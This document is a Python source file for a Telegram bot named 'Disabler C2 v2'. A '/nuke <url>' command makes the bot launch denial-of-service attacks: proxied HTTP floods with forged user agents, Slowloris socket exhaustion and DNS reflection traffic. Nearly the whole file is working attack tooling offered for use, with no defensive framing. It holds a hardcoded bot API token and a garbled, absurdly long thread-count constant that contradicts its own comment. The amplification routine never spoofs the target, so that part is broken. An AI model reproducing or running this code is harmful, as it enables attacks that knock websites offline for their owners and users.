# ------------- PATCH ZONE -------------
WORKERS_PER_METHOD = 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999          # 1000 threads * 9 methods = 9000 concurrent
PROXY_FILE         = "proxies.txt" # HTTP/SOCKS4/SOCKS5 list
AMP_REFLECTORS     = "reflectors.txt" # list of open DNS/NTP/CLDAP IPs
# --------------------------------------

import os, threading, time, random, socket, subprocess, requests, telebot, socks, struct
from urllib.parse import urlparse

API_TOKEN = "8380160715:AAGWrwhUB09539iUTi3DLxToQGmitlE2j_Q"
bot = telebot.TeleBot(API_TOKEN, threaded=True)

ATTACK_POOL = {}

# ---------- UTIL ----------
def rand_ip(): return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
def load_proxies():
    return [l.strip() for l in open(PROXY_FILE).readlines() if l.strip()] if os.path.exists(PROXY_FILE) else []
def load_reflectors():
    return [l.strip() for l in open(AMP_REFLECTORS).readlines() if l.strip()] if os.path.exists(AMP_REFLECTORS) else []

PROXIES   = load_proxies()
REFLECT   = load_reflectors()

# ---------- MEGA FLOOD ----------
def http_worker(url, method, proxy):
    headers = {"User-Agent": random.choice(open("user_agents.txt").read().splitlines())}
    if method == "NULL": headers["User-Agent"] = ""
    if method == "BOT":  headers["User-Agent"] = "Googlebot/2.1 (+http://www.google.com/bot.html)"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    while True:
        try:
            if method == "POST": requests.post(url, headers=headers, data=os.urandom(1024), timeout=3, proxies=proxies)
            else:                requests.get(url, headers=headers, timeout=3, proxies=proxies)
        except: pass

def udp_amp(target_ip, target_port):
    # DNS Amp (53) â€“ 1 request â†’ 50Ã— reply
    pkt = (b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
           b"\x05\x65\x78\x61\x6d\x70\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01")
    while True:
        for r in REFLECT:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(pkt, (r, 53))
                s.close()
            except: pass
        time.sleep(0.001)

def slowloris(url):
    host, port = urlparse(url).netloc, 443 if urlparse(url).scheme == "https" else 80
    sockets = []
    while True:
        try:
            for _ in range(1000 - len(sockets)):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(open('user_agents.txt').read().splitlines())}\r\n".encode())
                sockets.append(s)
            for s in list(sockets):
                try: s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                except: sockets.remove(s)
        except: pass
        time.sleep(10)

# ---------- LAUNCH ----------
def launch_attack(url, chat_id):
    ATTACK_POOL[chat_id] = True
    # HTTP Flood with proxies
    for method in ["GET","POST","HEAD","COOKIE","NULL","BYPASS","BOT"]:
        for _ in range(WORKERS_PER_METHOD):
            t = threading.Thread(target=http_worker, args=(url, method, random.choice(PROXIES) if PROXIES else None), daemon=True)
            t.start()
    # Slowloris
    threading.Thread(target=slowloris, args=(url,), daemon=True).start()
    # UDP Amp
    if REFLECT:
        for _ in range(100):
            threading.Thread(target=udp_amp, args=(urlparse(url).hostname, 80), daemon=True).start()

# ---------- TG HANDLERS ----------
@bot.message_handler(commands=["start"])
def cmd_start(m):
    bot.reply_to(m, "ðŸ©¸ **Disabler C2 v2** â€“ NUKE mode ON\n/nuke <url>")

@bot.message_handler(commands=["nuke"])
def cmd_nuke(m):
    try:
        _, url = m.text.split(maxsplit=1)
        chat_id = m.chat.id
        if chat_id in ATTACK_POOL:
            bot.reply_to(m, "Already running; /stop first")
            return
        launch_attack(url, chat_id)
        bot.reply_to(m, f"ðŸ’€ **NUKING `{url}` with {WORKERS_PER_METHOD*9} HTTP threads + Slowloris + UDP Amp**", parse_mode="Markdown")
    except ValueError:
        bot.reply_to(m, "Usage: /nuke <url>")

@bot.message_handler(commands=["stop"])
def cmd_stop(m):
    chat_id = m.chat.id
    ATTACK_POOL.pop(chat_id, None)
    bot.reply_to(m, "âœ… Attack stopped.")

# ---------- BOOT ----------
if __name__ == "__main__":
    bot.infinity_polling()